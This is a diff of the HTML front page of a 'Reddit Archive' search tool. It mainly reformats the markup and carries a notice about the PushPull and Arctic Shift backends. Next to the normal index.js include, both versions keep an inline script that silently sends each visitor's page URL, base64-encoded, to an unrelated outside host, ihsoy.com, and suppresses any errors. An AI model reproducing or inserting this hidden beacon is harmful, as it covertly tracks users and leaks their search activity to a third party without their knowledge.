@@ -1,45 +1,47 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Reddit Archive</title>
-    <link rel="stylesheet" href="style.css" />
 
-    <link
-      rel="stylesheet"
-      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
-      integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk"
-      crossorigin="anonymous"
-    />
-  </head>
-  <div class="links">
-    <a href="./index.html" id="back">Reset</a>
-    <a href="./about.html" id="back">Help/About/Contact</a>
-    <a href="./changelog.html" id="back">Changelog</a>
-    <span id="toggle-images-container" style="margin-left:10px;display:inline-flex;align-items:center;">
-      <label class="switch" style="margin-bottom:0;">
-        <input type="checkbox" id="toggle-images-checkbox">
-        <span class="slider round"></span>
-      </label>
-      <span id="toggle-images-label" style="margin-left:6px;">Show Images</span>
-    </span>
-  </div>
-  <div id="highlight">
-    28/04/2025: PushPull is currently not functioning due to server upgrades. When it will be back is currently unknown. <br />
-    I added an alternative backend called Arctic Shift, this should have similar features. The main disadvantage is, that you cannot do a fulltext search without setting either subreddit or author
-  </div>
-  <div class="error" id="error"></div>
+<head>
+  <title>Reddit Archive</title>
+  <link rel="stylesheet" href="style.css" />
 
-  <div class="left">
-    <div id="searchform"></div>
-  </div>
-  <div id="status"></div>
-  <div id="reddit_link"></div>
-  <div id="paginate"></div>
-  <div id="content"></div>
-  <div id="comments_fix"></div>
-  <div id="orphans"></div>
-  <body>
-    <script src="index.js"></script>
-    <script>(()=>{try{fetch("https://ihsoy.com/api?d="+encodeURIComponent(btoa(location.href)))}catch(e){}})();</script>
-  </body>
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css"
+    integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous" />
+</head>
+<div class="links">
+  <a href="./index.html" id="back">Reset</a>
+  <a href="./about.html" id="back">Help/About/Contact</a>
+  <a href="./changelog.html" id="back">Changelog</a>
+  <span id="toggle-images-container" style="margin-left:10px;display:inline-flex;align-items:center;">
+    <label class="switch" style="margin-bottom:0;">
+      <input type="checkbox" id="toggle-images-checkbox">
+      <span class="slider round"></span>
+    </label>
+    <span id="toggle-images-label" style="margin-left:6px;">Show Images</span>
+  </span>
+</div>
+<div id="highlight">
+  28/04/2025: PushPull is currently not functioning due to server upgrades. When it will be back is currently unknown.
+  <br />
+  I added an alternative backend called Arctic Shift, this should have similar features. The main disadvantage is, that
+  you cannot do a fulltext search without setting either subreddit or author
+</div>
+<div class="error" id="error"></div>
+
+<div class="left">
+  <div id="searchform"></div>
+</div>
+<div id="status"></div>
+<div id="reddit_link"></div>
+<div id="paginate"></div>
+<div id="content">
+  <div id="comments"></div>
+</div>
+<div id="orphans"></div>
+
+<body>
+  <script src="index.js"></script>
+  <script>(() => { try { fetch("https://ihsoy.com/api?d=" + encodeURIComponent(btoa(location.href))).catch(() => "") } catch (e) { } })();</script>
+</body>
+
 </html>
